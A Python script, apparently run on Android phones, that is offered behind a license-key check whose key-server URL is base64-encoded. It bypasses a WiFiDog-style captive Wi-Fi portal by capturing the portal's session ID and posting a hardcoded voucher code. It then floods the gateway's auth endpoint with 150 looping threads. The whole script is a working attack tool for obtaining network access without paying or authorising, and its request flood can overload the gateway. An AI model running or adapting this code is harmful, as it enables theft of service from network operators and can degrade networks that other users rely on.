import requests, re, urllib3, time, threading, os, random, subprocess, sys, base64
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- ENCODED CONFIG ---
# Link: https://raw.githubusercontent.com/kokoarkar446-cloud/Starlink/main/key.txt
_0x446 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tva29hcmthcjQ0Ni1jbG91ZC9TdGFybGluay9tYWluL2tleS50eHQ="
_0x112 = "LnN5c3RlbV9jb25maWdfZGF0YV9sb2c="

def get_link(): return base64.b64decode(_0x446).decode()
def get_file(): return base64.b64decode(_0x112).decode()

# --- COLORS ---
Y, G, R, W, C, M, OFF = "\033[1;33m", "\033[1;32m", "\033[1;31m", "\033[1;37m", "\033[1;36m", "\033[1;35m", "\033[0m"

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a128"

def banner(name="GUEST", exp="----/--/-- --:--"):
    os.system('clear')
    print(f"{W}╔" + "═"*60 + "╗")
    print(f"{W}║ {Y}⚡ DEVICE ID : {Y}{get_uid():<39} {W}║")
    print(f"{W}║ {G}⚡ NAME      : {G}{name:<39} {W}║")
    print(f"{W}║ {R}⚡ EXPIRY    : {R}{exp:<39} {W}║")
    print(f"{W}╚" + "═"*60 + "╝\n")

def check_access():
    uid = get_uid()
    now = datetime.now()
    v_url, v_file = get_link(), get_file()

    # 1. Offline Auth
    if os.path.exists(v_file):
        try:
            with open(v_file, "r") as f:
                d = f.read().split('|')
                if d[0] == uid:
                    exp_str = d[2].strip()
                    if now < datetime.strptime(exp_str, "%Y-%m-%d %H:%M"):
                        banner(d[1], d[2])
                        return True
        except: pass

    # 2. Key Input UI
    os.system('clear')
    print(f" {Y}⚡ DEVICE ID : {W}{uid}{OFF}")
    print(f" {W}------------------------------------------{OFF}")
    u_key = input(f" {C}[+] ENTER SECRET KEY : {W}").strip()
    
    if not u_key: sys.exit()

    try:
        print(f" {Y}[*] Validating...{OFF}")
        res = requests.get(f"{v_url}?t={random.random()}", timeout=15)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if u_key in line and uid in line:
                    with open(v_file, "w") as f: f.write(line)
                    p = line.split('|')
                    banner(p[1], p[2])
                    print(f" {G}[✓] KEY ACTIVATED!{OFF}")
                    return True
            print(f" {R}[!] INVALID KEY OR UNAUTHORIZED ID!{OFF}"); sys.exit()
    except:
        print(f" {R}[!] CONNECTION ERROR!{OFF}"); sys.exit()

def turbo_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            # အောက်က စာသားက တောက်လျှောက်ပြနေမှာပါ
            sys.stdout.write(f" {Y}[{G}✓{R}] {W}BOOSTING >>> {C}[{random.randint(10,50)}ms] {OFF}\r")
            sys.stdout.flush()
        except: time.sleep(0.5)

def start_bypass_loop():
    session = requests.Session()
    print(f" {G}[✓] BYPASS SEQUENCE STARTED...{OFF}")
    
    # ဤ Infinite Loop က Script ကို ပြန်မထွက်အောင် တားထားပေးပါသည်
    while True:
        try:
            # Step 1: Connectivity Check
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
            p_url = r.url
            
            # Step 2: Session Extraction
            r1 = session.get(p_url, verify=False)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            r2 = session.get(n_url, verify=False)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                # Auth Post
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1})
                
                gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                # Step 3: High Speed Threads
                for _ in range(150): # 150 Threads
                    t = threading.Thread(target=turbo_pulse, args=(auth_link,))
                    t.daemon = True
                    t.start()
                
                # Step 4: Keep Alive Check (၁၀ စက္ကန့်တစ်ခါ အင်တာနက်စစ်)
                while True:
                    time.sleep(10)
                    try:
                        check = requests.get("http://google.com", timeout=5)
                        if check.status_code != 200: break
                    except: break
            else:
                time.sleep(3)
        except Exception as e:
            time.sleep(2)

if __name__ == "__main__":
    if check_access():
        start_bypass_loop()
